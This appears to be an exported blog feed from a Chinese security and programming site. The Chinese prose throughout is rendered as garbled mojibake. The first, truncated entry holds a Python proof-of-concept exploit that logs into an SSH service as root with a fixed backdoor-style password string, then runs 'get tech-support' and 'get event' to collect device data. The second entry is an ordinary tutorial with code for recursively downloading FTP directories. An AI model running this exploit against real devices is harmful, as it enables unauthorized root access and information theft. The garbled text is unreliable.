class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pexpect <span class="keyword">import</span> pxssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">22</span>, loginTimeout=<span class="number">10</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        readTimeout=<span class="number">2</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">readUntilTimeout</span><span class="params">()</span>:</span></span><br><span class="line">            errFlag = <span class="literal">False</span></span><br><span class="line">            data = <span class="string">''</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> errFlag:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data += ssh.read_nonblocking(</span><br><span class="line">                        size=<span class="number">65536</span>,</span><br><span class="line">                        timeout=readTimeout</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">except</span> pexpect.exceptions.ExceptionPexpect <span class="keyword">as</span> err:</span><br><span class="line">                    errFlag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">        readUntilTimeout()  <span class="comment"># skip verbose strings</span></span><br><span class="line">        toNum = <span class="number">0</span></span><br><span class="line">        ssh.send(cmd + <span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        data = readUntilTimeout()</span><br><span class="line">        ret = data</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'-&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="number">-10</span>:]) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            data = readUntilTimeout()</span><br><span class="line">            ret += data</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ssh.send(<span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    ssh = pxssh.pxssh(timeout=readTimeout)</span><br><span class="line">    ssh.login(</span><br><span class="line">        server=host,</span><br><span class="line">        port=port,</span><br><span class="line">        username=<span class="string">'root'</span>,</span><br><span class="line">        password=<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span>,</span><br><span class="line">        auto_prompt_reset=<span class="literal">False</span>,</span><br><span class="line">        login_timeout=loginTimeout,</span><br><span class="line">    )</span><br><span class="line">    banner = ssh.before</span><br><span class="line">    ssh.sendline(<span class="string">'?'</span>)</span><br><span class="line">    help = ssh.read_nonblocking(size=<span class="number">65536</span>, timeout=readTimeout)</span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure><p>ä»£ç è¯´æ˜ï¼š</p><ul><li>26è¡Œï¼šè¿ç»­å‘é€å¤šä¸ª\nï¼Œä¸€æ¬¡æ€§å°†æœåŠ¡å™¨ç«¯çš„å¤šä¸ªç»“æœåˆ†æ®µè·å–åˆ°å®¢æˆ·ç«¯çš„æ¥æ”¶ç¼“å­˜ä¸­ï¼Œè¿™æ ·å¯ä»¥å‡å°‘äº¤äº’ï¼Œæé«˜ç¨‹åºæ•ˆç‡ã€‚</li><li>29è¡Œï¼šåˆ¤æ–­æ¯æ¬¡è¯»å–çš„ç¼“å­˜åŒºä¸­çš„æ•°æ®çš„å10ä¸ªå­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ <strong>-&gt;</strong> å­—ç¬¦ï¼Œæ¥è¯†åˆ«æœ€åä¸€ä¸ªç»“æœåˆ†æ®µã€‚</li></ul><p>ä»£ç é€»è¾‘ä¸Telnetç¨‹åºç±»ä¼¼ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Security </tag>
            
            <tag> CVE </tag>
            
            <tag> PoC/Exp </tag>
            
            <tag> Vul </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonå®ç°ä¸‹è½½FTPæœåŠ¡å™¨çš„æ•´ä¸ªç›®å½•ï¼ˆæ–‡ä»¶å¤¹ï¼‰</title>
      <link href="/tech/downloading-ftp-directory-recursively-with-python/"/>
      <url>/tech/downloading-ftp-directory-recursively-with-python/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Downloading FTP Directory Recursively with Python</strong></em></li><li>Author: dog2</li></ul><hr><h3 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h3><ul><li>å¿«é€Ÿæ‰¹é‡ä¸‹è½½å¤šä¸ªFTPæœåŠ¡å™¨çš„ä¸Šçš„ç›®å½•ï¼ˆæŒ‡å®šç›®å½•æˆ–æ•´ä¸ªç›®å½•ï¼‰ã€‚</li></ul><a id="more"></a><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>æ ¸å¿ƒé—®é¢˜ï¼šé’ˆå¯¹ä¸€ä¸ªFTP Serverï¼Œè¦èƒ½å¤Ÿä¸‹è½½å…¶æŒ‡å®šç›®å½•ã€‚å³é€’å½’éå†æ‰€æœ‰ç›®å½•ï¼Œé’ˆå¯¹æ¯ä¸ªç›®å½•ä¸­çš„å­ç›®å½•ï¼Œåˆ›å»ºæœ¬åœ°ç›¸åº”ç›®å½•ï¼›é’ˆå¯¹æ¯ä¸ªç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œä¸‹è½½åˆ°æœ¬åœ°ç›¸åº”ç›®å½•ã€‚</li><li>ä¸‹è½½æ‰€æœ‰æ–‡ä»¶çš„è¿‡ç¨‹æœ€å¥½ä¹Ÿæ˜¯å¯å¹¶å‘çš„ï¼Œä»¥åŠ å¿«æ•´ä¸ªä¸‹è½½è¿‡ç¨‹ã€‚</li></ul><h3 id="å‰è½¦ä¹‹è½®"><a href="#å‰è½¦ä¹‹è½®" class="headerlink" title="å‰è½¦ä¹‹è½®"></a>å‰è½¦ä¹‹è½®</h3><p>éœ€æ±‚åŠå®ç°æ€è·¯å·²ç»æ¸…æ¥šï¼Œå‰©ä¸‹çš„å°±æ˜¯ç¼–ç æµ‹è¯•äº†ã€‚</p><p>æŒ‰ç…§æƒ¯ä¾‹ï¼Œä¸ºé¿å…é‡å¤é€ è½®å­ï¼Œåœ¨å¼€å·¥å‰æœ‰å¿…è¦ä¸Šè°·æ­Œç™¾åº¦ä¸€ä¸‹ï¼Œç¡®å®šå‰äººæ˜¯å¦å·²ç»é€ å‡ºäº†å¥½ç”¨çš„è½®å­ã€‚<br>æ‰¾åˆ°å¦‚ä¸‹å‡ ä¸ªï¼š</p><ol><li><span class="exturl" data-url="aHR0cDovL3d3dy5qYjUxLm5ldC9hcnRpY2xlLzMzOTg2Lmh0bQ==">é€šè¿‡pythonä¸‹è½½FTPä¸Šçš„æ–‡ä»¶å¤¹çš„å®ç°ä»£ç <i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2Nhbmx5bmV0Lml0ZXllLmNvbS9ibG9nLzgzNjk5Ng==">pythonå®ç°çš„ftpè‡ªåŠ¨ä¸Šä¼ ä¸‹è½½ç¨‹åºï¼ˆæ”¯æŒç›®å½•é€’å½’æ“ä½œï¼‰<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5qYjUxLm5ldC9hcnRpY2xlLzY3MTk2Lmh0bQ==">pythonå®ç°æ”¯æŒç›®å½•FTPä¸Šä¼ ä¸‹è½½æ–‡ä»¶çš„æ–¹æ³•<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9mdHB1dGlsLzMuMg==">pythonç¬¬ä¸‰æ–¹åº“ ftputil<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9weWZ0cHN5bmMvMS4wLjM=">pythonç¬¬ä¸‰æ–¹åº“ pyftpsync<i class="fa fa-external-link-alt"></i></span></li></ol><p>é€ä¸€æµ‹è¯•ï¼Œéƒ½ä¸å¤ªå¥½ç”¨ã€‚</p><p>1åœ¨ç°å®æ—¶ä½¿ç”¨os.chdiråˆ‡æ¢æœ¬åœ°ä¸‹è½½ç›®å½•ï¼Œæ‰¹é‡ä¸‹è½½ï¼ˆå¤šçº¿ç¨‹å¹¶å‘ä¸‹è½½å¤šä¸ªæœåŠ¡å™¨ç›®å½•ï¼‰æ—¶ä¼šäº§ç”Ÿç›®å½•æ··ä¹±ã€‚</p><p>3åœ¨ä¸‹è½½æ¯ä¸ªæ–‡ä»¶éƒ½éœ€è¦æ‰§è¡Œlså‡½æ•°ç¡®è®¤å…¶å­˜åœ¨äºè¿œç¨‹ç›®å½•ï¼Œæ€§èƒ½å¾ˆä½ã€‚</p><p>ä½¿ç”¨2 4 5æ²¡æœ‰æˆåŠŸä¸‹è½½è¿‡ï¼Œå¯èƒ½æ˜¯ç”¨æ³•ä¸å¯¹ï¼Œç²—ç•¥æ‰«äº†ä¸‹æ–‡æ¡£å’Œæºç ï¼Œä¹Ÿæ²¡æ‰¾åˆ°æ­£ç¡®ç”¨æ³•ã€‚å¦‚æœä½ çŸ¥é“æ­£ç¡®ç”¨æ³•ï¼Œè¿˜è¯·æŒ‡ç‚¹ã€‚</p><h3 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h3><p>æ—¢ç„¶å‰äººçš„è½®å­éƒ½ä¸å¤ªå¥½ç”¨ï¼Œåªå¥½å†é€ ä¸€ä¸ªã€‚ç›¸å¯¹å…¶ä»–åè®®è€Œè¨€ï¼ŒFTPåè®®è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œå› æ­¤æœ€å¥½åŸºäºå·²æœ‰çš„FTPåº“æ¥å®ç°ï¼Œpythonçš„è‡ªå¸¦FTPåº“æ˜¯ftplibï¼Œè¿™é‡Œå°±é€‰ç”¨å®ƒã€‚</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2Z0cGxpYi5odG1s">æ–‡æ¡£<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMi43L0xpYi9mdHBsaWIucHk=">æºç <i class="fa fa-external-link-alt"></i></span></li></ul><p>å¤§æ¦‚å®ç°æ€è·¯åŠæµç¨‹å·²åœ¨0x01ä¸­æŒ‡å‡ºï¼Œè¿™é‡Œå¯èƒ½éœ€è¦ç”¨åˆ°ftplibä¸­çš„ä¸¤ä¸ªå‡½æ•°</p><ul><li><strong>ftplib.FTP.dir()</strong> : ç”¨äºåˆ—ä¸¾ç›®å½•ä¿¡æ¯ï¼Œå…¶å†…éƒ¨å®ç°è°ƒç”¨çš„æ˜¯FTPåè®®ä¸­çš„LISTè¯·æ±‚ï¼Œè¾“å‡ºæ ¼å¼ç±»ä¼¼linuxä¸‹çš„å‘½ä»¤_<strong>ls -alh</strong>_ã€‚è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥å‡½æ•°æ˜¯ä¸è¿”å›ç›®å½•ä¿¡æ¯çš„å­—ç¬¦ä¸²çš„ï¼Œå®ƒåœ¨å†…éƒ¨å®ç°ä¸­è°ƒç”¨äº†ftplib.FTP.retrlines()å‡½æ•°å¾—åˆ°è¿”å›æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå¹¶é»˜è®¤ä½¿ç”¨printlnå‡½æ•°å¤„ç†æ¯è¡Œæ•°æ®ï¼Œå³æ‰“å°è‡³æ ‡å‡†è¾“å‡ºã€‚å½“ç„¶ï¼Œå¤„ç†æ¯è¡Œæ•°æ®çš„å‡½æ•°æ˜¯å¯ä»¥è¢«æ›¿æ¢çš„ï¼Œåœ¨dir()å‡½æ•°çš„å‚æ•°ä¸­æŒ‡å‡ºå³å¯ã€‚å°½ç®¡å¦‚æ­¤è¿˜æ˜¯éš¾ä»¥å°†ç›®å½•ä¿¡æ¯å­˜å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²å¹¶è¿”å›ï¼Œä»¥ä¾›æˆ‘ä»¬åç»­è°ƒç”¨ã€‚åœ¨0x02ä¸­æåˆ°çš„3æ˜¯é€šè¿‡æ˜¯ç»™dirå‡½æ•°ä¼ å…¥è‡ªå®šä¹‰ç±»çš„å®ä¾‹å‡½æ•°ï¼Œå¹¶å°†ç›®å½•ä¿¡æ¯å­˜å‚¨åœ¨è‡ªå®šä¹‰ç±»çš„å®ä¾‹å˜é‡ä¸­æ¥å¾—åˆ°è¿™ä¸ªå€¼çš„ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è‡ªå®šä¹‰å‡½æ•°ç»“åˆå…¨å±€å˜é‡çš„æ–¹å¼æ¥å¾—åˆ°è¿™ä¸ªå€¼ã€‚è¿™ç§å®ç°ç•¥æ˜¾è¹©è„šï¼Œå› æ­¤åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å‚ç…§åŸæœ‰dirå‡½æ•°çš„å®ç°æ–¹å¼ï¼Œåœ¨è‡ªå®šä¹‰ç±»ä¸­å®ç°ä¸€ä¸ªæ–°çš„dirå‡½æ•°ï¼Œå®ƒä¸ç”¨å†ä¼ å…¥å¤„ç†æ¯è¡Œæ•°æ®çš„å‡½æ•°ï¼Œä¸”èƒ½å¤Ÿè¿”å›ç›®å½•ä¿¡æ¯ã€‚</li><li><strong>ftplib.FTP.retrbinary()</strong> : ç”¨äºæŒ‡å®šå¹¶å‘é€æŸç§FTPè¯·æ±‚ï¼Œå¹¶ä»¥äºŒè¿›åˆ¶æ•°æ®æ¥æ”¶å“åº”ã€‚è¿™é‡Œä½¿ç”¨å®ƒæ¥æ‰§è¡ŒFTPåè®®ä¸­çš„RETRå‘½ä»¤ï¼Œä»¥ä¸‹è½½FTPæœåŠ¡å™¨ä¸ŠæŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ã€‚</li></ul><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>å®ç°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ftplib</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FtpDownloader</span><span class="params">(object)</span>:</span></span><br><span class="line">    PATH_TYPE_UNKNOWN = <span class="number">-1</span></span><br><span class="line">    PATH_TYPE_FILE = <span class="number">0</span></span><br><span class="line">    PATH_TYPE_DIR = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, user=None, passwd=None, port=<span class="number">21</span>, timeout=<span class="number">10</span>)</span>:</span></span><br><span class="line">        self.conn = ftplib.FTP(</span><br><span class="line">            host=host,</span><br><span class="line">            user=user,</span><br><span class="line">            passwd=passwd,</span><br><span class="line">            timeout=timeout</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dir</span><span class="params">(self, *args)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        by defualt, ftplib.FTP.dir() does not return any value.</span></span><br><span class="line"><span class="string">        Instead, it prints the dir info to the stdout.</span></span><br><span class="line"><span class="string">        So we re-implement it in FtpDownloader, which is able to return the dir info.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        info = []</span><br><span class="line">        cmd = <span class="string">'LIST'</span></span><br><span class="line">        <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">            <span class="keyword">if</span> arg:</span><br><span class="line">                cmd = cmd + (<span class="string">' '</span> + arg)</span><br><span class="line">        self.conn.retrlines(cmd, <span class="keyword">lambda</span> x: info.append(x.strip().split()))</span><br><span class="line">        <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(self, rdir=None, init=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        recursively get the tree structure of a directory on FTP Server.</span></span><br><span class="line"><span class="string">        args:</span></span><br><span class="line"><span class="string">            rdir - remote direcotry path of the FTP Server.</span></span><br><span class="line"><span class="string">            init - flag showing whether in a recursion.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">if</span> init <span class="keyword">and</span> rdir <span class="keyword">in</span> (<span class="string">'.'</span>, <span class="literal">None</span>):</span><br><span class="line">            rdir = self.conn.pwd()</span><br><span class="line">        tree = []</span><br><span class="line">        tree.append((rdir, self.PATH_TYPE_DIR))</span><br><span class="line"></span><br><span class="line">        dir_info = self.dir(rdir)</span><br><span class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> dir_info:</span><br><span class="line">            attr = info[<span class="number">0</span>]  <span class="comment"># attribute</span></span><br><span class="line">            name = info[<span class="number">-1</span>]</span><br><span class="line">            path = os.path.join(rdir, name)</span><br><span class="line">            <span class="keyword">if</span> attr.startswith(<span class="string">'-'</span>):</span><br><span class="line">                tree.append((path, self.PATH_TYPE_FILE))</span><br><span class="line">            <span class="keyword">elif</span> attr.startswith(<span class="string">'d'</span>):</span><br><span class="line">                <span class="keyword">if</span> (name == <span class="string">'.'</span> <span class="keyword">or</span> name == <span class="string">'..'</span>):  <span class="comment"># skip . and ..</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                tree.extend(self.tree(rdir=path,init=<span class="literal">False</span>))  <span class="comment"># recurse</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tree.append(path, self.PATH_TYPE_UNKNOWN)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tree</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">downloadFile</span><span class="params">(self, rfile, lfile)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        download a file with path %rfile on a FTP Server and save it to locate</span></span><br><span class="line"><span class="string">        path %lfile.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        ldir = os.path.dirname(lfile)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ldir):</span><br><span class="line">            os.makedirs(ldir)</span><br><span class="line">        f = open(lfile, <span class="string">'wb'</span>)</span><br><span class="line">        self.conn.retrbinary(<span class="string">'RETR %s'</span> % rfile, f.write)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">treeStat</span><span class="params">(self, tree)</span>:</span></span><br><span class="line">        numDir = <span class="number">0</span></span><br><span class="line">        numFile = <span class="number">0</span></span><br><span class="line">        numUnknown = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> path, pathType <span class="keyword">in</span> tree:</span><br><span class="line">            <span class="keyword">if</span> pathType == self.PATH_TYPE_DIR:</span><br><span class="line">                numDir += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_FILE:</span><br><span class="line">                numFile += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_UNKNOWN:</span><br><span class="line">                numUnknown += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> numDir, numFile, numUnknown</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">downloadDir</span><span class="params">(self, rdir=<span class="string">'.'</span>, ldir=<span class="string">'.'</span>, tree=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                    errHandleFunc=None, verbose=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        download a direcotry with path %rdir on a FTP Server and save it to</span></span><br><span class="line"><span class="string">        locate path %ldir.</span></span><br><span class="line"><span class="string">        args:</span></span><br><span class="line"><span class="string">            tree - the tree structure return by function FtpDownloader.tree()</span></span><br><span class="line"><span class="string">            errHandleFunc - error handling function when error happens in</span></span><br><span class="line"><span class="string">                downloading one file, such as a function that writes a log.</span></span><br><span class="line"><span class="string">                By default, the error is print to the stdout.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> tree:</span><br><span class="line">            tree = self.tree(rdir=rdir, init=<span class="literal">True</span>)</span><br><span class="line">        numDir, numFile, numUnknown = self.treeStat(tree)</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Host %s tree statistic:'</span> % self.conn.host</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%d directories, %d files, %d unknown type'</span> % (</span><br><span class="line">                numDir,</span><br><span class="line">                numFile,</span><br><span class="line">                numUnknown</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ldir):</span><br><span class="line">            os.makedirs(ldir)</span><br><span class="line">        ldir = os.path.abspath(ldir)</span><br><span class="line"></span><br><span class="line">        numDownOk = <span class="number">0</span></span><br><span class="line">        numDownErr = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> rpath, pathType <span class="keyword">in</span> tree:</span><br><span class="line">            lpath = os.path.join(ldir, rpath.strip(<span class="string">'/'</span>).strip(<span class="string">'\\'</span>))</span><br><span class="line">            <span class="keyword">if</span> pathType == self.PATH_TYPE_DIR:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(lpath):</span><br><span class="line">                    os.makedirs(lpath)</span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_FILE:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.downloadFile(rpath, lpath)</span><br><span class="line">                    numDownOk += <span class="number">1</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                    numDownErr += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> errHandleFunc:</span><br><span class="line">                        errHandleFunc(err, rpath, lpath)</span><br><span class="line">                    <span class="keyword">elif</span> verbose:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'An Error occurred when downloading '</span>\</span><br><span class="line">                              <span class="string">'remote file %s'</span> % rpath</span><br><span class="line">                        traceback.print_exc()</span><br><span class="line">                        <span class="keyword">print</span></span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'Host %s: %d/%d/%d(ok/err/total) files downloaded'</span> % (</span><br><span class="line">                        self.conn.host,</span><br><span class="line">                        numDownOk,</span><br><span class="line">                        numDownErr,</span><br><span class="line">                        numFile</span><br><span class="line">                    )</span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_UNKNOWN:</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'Unknown type romote path got: %s'</span> % rpath</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Host %s directory %s download finished:'</span> % (</span><br><span class="line">                self.conn.host, rdir</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%d directories, %d(%d failed) files, %d unknown type.'</span> % (</span><br><span class="line">                numDir,</span><br><span 